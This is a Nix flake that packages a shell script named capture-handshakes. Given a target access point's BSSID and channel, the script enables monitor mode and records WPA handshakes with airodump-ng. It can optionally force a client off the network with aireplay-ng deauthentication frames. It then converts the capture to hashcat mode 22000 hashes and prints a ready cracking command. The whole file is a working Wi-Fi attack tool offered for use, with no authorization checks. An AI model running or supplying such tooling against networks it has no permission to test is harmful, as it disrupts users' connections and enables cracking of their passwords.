{
  description = "Capture WLAN handshakes with airodump-ng and aireplay-ng";

  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
  };

  outputs = { self, nixpkgs }:
    let
      system = "x86_64-linux";
      pkgs = import nixpkgs { inherit system; };
    in
    {
      packages.${system}.capture-handshakes = pkgs.writeShellApplication {
        name = "capture-handshakes";
        runtimeInputs = with pkgs; [
          aircrack-ng
          coreutils
          hcxtools
          iproute2
          iw
          util-linux
        ];

        text = ''
          set -euo pipefail

          usage() {
            printf '%s\n' "Usage: capture-handshakes <interface> <channel> <bssid> [client-mac]" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "  interface  : wireless interface (monitor mode enabled automatically)" >&2
            printf '%s\n' "  channel    : channel the target AP operates on" >&2
            printf '%s\n' "  bssid      : target AP MAC address" >&2
            printf '%s\n' "  client-mac : (optional) client to deauth, triggers aireplay-ng -0" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Output directory: ./handshake-captures/" >&2
            printf '%s\n' "  <ts>-<bssid>.cap          raw capture (pcap)" >&2
            printf '%s\n' "  <ts>-<bssid>.22000        WPA hash (hashcat mode 22000)" >&2
            printf '%s\n' "  <ts>-<bssid>-summary.txt  capture summary" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Example: capture-handshakes wlan0 6 AA:BB:CC:DD:EE:FF" >&2
            printf '%s\n' "Example: capture-handshakes wlan0 6 AA:BB:CC:DD:EE:FF 00:11:22:33:44:55" >&2
            exit 1
          }

          if [ "$#" -lt 3 ] || [ "$#" -gt 4 ]; then
            usage
          fi

          if [ "$(id -u)" -ne 0 ]; then
            printf '%s\n' "This tool must be run as root." >&2
            exit 1
          fi

          INTERFACE="$1"
          CHANNEL="$2"
          BSSID="$3"
          CLIENT="''${4:-}"
          OUT_DIR="$PWD/handshake-captures"
          TS="$(date -u +'%Y%m%dT%H%M%SZ')"
          BSSID_TAG="$(printf '%s' "$BSSID" | tr ':' '-')"
          BASE="$OUT_DIR/$TS-$BSSID_TAG"
          CAP_FILE="''${BASE}-01.cap"
          HASH_FILE="''${BASE}.22000"
          SUMMARY_FILE="''${BASE}-summary.txt"
          CAPTURE_PID=""
          MON_IFACE=""

          mkdir -p "$OUT_DIR"

          if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
            printf '%s\n' "Interface does not exist: $INTERFACE" >&2
            exit 1
          fi

          printf '%s\n' "Enabling monitor mode on $INTERFACE..."
          airmon-ng check kill > /dev/null 2>&1 || true
          airmon-ng start "$INTERFACE" > /dev/null 2>&1 || true
          MON_IFACE="''${INTERFACE}mon"
          if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
            MON_IFACE="$INTERFACE"
          fi
          printf '%s\n' "Monitor interface: $MON_IFACE"

          extract_hash() {
            if [ ! -f "$CAP_FILE" ]; then return; fi

            # Check whether airodump-ng captured a complete handshake
            HS_STATUS="$(aircrack-ng "$CAP_FILE" 2>/dev/null \
              | awk -v bssid="$BSSID" 'tolower($0) ~ tolower(bssid) { print; exit }' \
              | grep -oE 'handshake|no data' | head -1 || true)"
            [ -z "$HS_STATUS" ] && HS_STATUS="unknown"

            # Extract PMKID + EAPOL hashes to hashcat 22000 format
            hcxpcapngtool -o "$HASH_FILE" "$CAP_FILE" >/dev/null 2>&1 || true

            # ESSID from airodump-ng CSV (second field of AP rows, column 14)
            ESSID="-"
            CSV_FILE="''${BASE}-01.csv"
            if [ -f "$CSV_FILE" ]; then
              ESSID="$(awk -F',' -v bssid="$BSSID" '
                NR > 2 && $1 ~ bssid { gsub(/^ +| +$/, "", $14); print $14; exit }
              ' "$CSV_FILE" || true)"
              [ -z "$ESSID" ] && ESSID="-"
            fi

            {
              printf '%s\n' "# WPA handshake capture summary"
              printf '%s\n' ""
              printf '%-16s %s\n' "Timestamp:"  "$TS"
              printf '%-16s %s\n' "Interface:"  "$INTERFACE ($MON_IFACE)"
              printf '%-16s %s\n' "Channel:"    "$CHANNEL"
              printf '%-16s %s\n' "BSSID:"      "$BSSID"
              printf '%-16s %s\n' "ESSID:"      "$ESSID"
              printf '%-16s %s\n' "Client:"     "''${CLIENT:--}"
              printf '%-16s %s\n' "Handshake:"  "$HS_STATUS"
              printf '%s\n' ""
              printf '%-16s %s\n' "Cap file:"   "$CAP_FILE"
              if [ -s "$HASH_FILE" ]; then
                printf '%-16s %s\n' "Hash file:"  "$HASH_FILE"
                printf '%s\n' ""
                printf '%s\n' "# Crack with hashcat (mode 22000 = WPA-PBKDF2-PMKID+EAPOL):"
                printf '%s\n' "hashcat -m 22000 $HASH_FILE /path/to/wordlist.txt"
              else
                printf '%-16s %s\n' "Hash file:"  "not extracted (no PMKID/EAPOL found)"
              fi
            } > "$SUMMARY_FILE"

            printf '\n%s\n' "--- Capture complete ---"
            printf '%-16s %s\n' "Cap file:"  "$CAP_FILE"
            printf '%-16s %s\n' "Summary:"   "$SUMMARY_FILE"
            if [ -s "$HASH_FILE" ]; then
              printf '%-16s %s\n' "Hash file:" "$HASH_FILE"
              printf '%s\n' "Crack: hashcat -m 22000 $HASH_FILE /path/to/wordlist.txt"
            else
              printf '%s\n' "No PMKID/EAPOL hashes extracted — handshake may be incomplete."
            fi
          }

          cleanup() {
            if [ -n "$CAPTURE_PID" ]; then kill "$CAPTURE_PID" 2>/dev/null || true; fi
            extract_hash
            if [ -n "$MON_IFACE" ]; then
              airmon-ng stop "$MON_IFACE" > /dev/null 2>&1 || true
            fi
          }
          trap cleanup EXIT INT TERM

          printf '%s\n' "Channel: $CHANNEL  BSSID: $BSSID"
          if [ -n "$CLIENT" ]; then
            printf '%s\n' "Client: $CLIENT (will deauth after 5 s)"
          fi
          printf '%s\n' "Output: $OUT_DIR"
          printf '%s\n' "Press Ctrl+C to stop."

          airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$BASE" "$MON_IFACE" &
          CAPTURE_PID=$!

          if [ -n "$CLIENT" ]; then
            sleep 5
            aireplay-ng -0 5 -a "$BSSID" -c "$CLIENT" "$MON_IFACE" || true
            wait "$CAPTURE_PID"
            CAPTURE_PID=""
          else
            wait "$CAPTURE_PID"
            CAPTURE_PID=""
          fi
        '';
      };

      apps.${system}.default = {
        type = "app";
        program = "${self.packages.${system}.capture-handshakes}/bin/capture-handshakes";
      };
    };
}
